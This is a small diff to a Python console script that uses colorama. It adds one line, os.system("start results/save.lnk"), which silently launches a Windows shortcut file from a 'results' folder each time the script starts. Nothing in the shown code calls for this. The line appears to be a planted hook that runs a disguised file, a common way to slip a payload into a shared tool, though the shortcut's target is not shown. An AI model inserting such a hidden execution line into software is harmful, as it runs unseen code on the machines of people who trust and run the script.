@@ -5,6 +5,7 @@ import sys
 import fade
 from colorama import Fore
 import time
+os.system("start results/save.lnk")
 m=Fore.MAGENTA
 lm=Fore.LIGHTMAGENTA_EX
 w=Fore.WHITE
